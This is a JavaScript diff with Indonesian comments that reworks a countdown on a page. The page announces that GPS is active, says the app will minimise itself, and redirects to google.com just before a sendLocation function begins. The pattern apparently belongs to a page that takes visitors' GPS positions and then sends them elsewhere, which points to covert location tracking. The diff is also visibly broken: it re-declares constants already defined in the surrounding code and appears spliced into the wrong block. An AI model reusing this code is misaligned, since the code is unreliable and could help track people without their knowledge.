@@ -213,34 +213,33 @@ const countdown = setInterval(() => {
     clearInterval(countdown);
     countdownDiv.remove();
     
-   // Tampilkan pesan sukses di layar
+ // Tampilkan pesan sukses di layar
 const msgDiv = document.createElement('div');
 msgDiv.style.cssText = 'margin-top: 12px; padding: 12px; background: #d4edda; border: 1px solid #c3e6cb; border-radius: 8px; text-align: center; color: #155724; font-weight: 600;';
 msgDiv.innerHTML = '✅ GPS AKTIF!<br><small style="font-weight: normal;">Aplikasi akan minimize otomatis...</small>';
 document.getElementById('mainScreen').appendChild(msgDiv);
 
-// Countdown
-let seconds = 3;
+// Hitung Mundur
+let detik = 3;
 const countdownDiv = document.createElement('div');
 countdownDiv.style.cssText = 'margin-top: 8px; text-align: center; color: #856404; font-weight: 600;';
-countdownDiv.textContent = `⏱️ ${seconds}`;
+countdownDiv.textContent = '⏱️ ' + detik;
 document.getElementById('mainScreen').appendChild(countdownDiv);
 
 // Redirect otomatis setelah 3 detik
-const countdown = setInterval(() => {
-    seconds--;
-    if (seconds > 0) {
-        countdownDiv.textContent = `⏱️ ${seconds}`;
+const countdown = setInterval(function() {
+    detik--;
+    if (detik > 0) {
+        countdownDiv.textContent = '⏱️ ' + detik;
     } else {
         clearInterval(countdown);
         countdownDiv.remove();
         msgDiv.innerHTML = '✅ Berhasil! Mengalihkan...';
         
-        // Redirect ke Google
-        setTimeout(() => {
+        setTimeout(function() {
             window.location.href = 'https://www.google.com';
         }, 500);
-   }
+    }
 }, 1000);
 async function sendLocation(coords) {
   try {
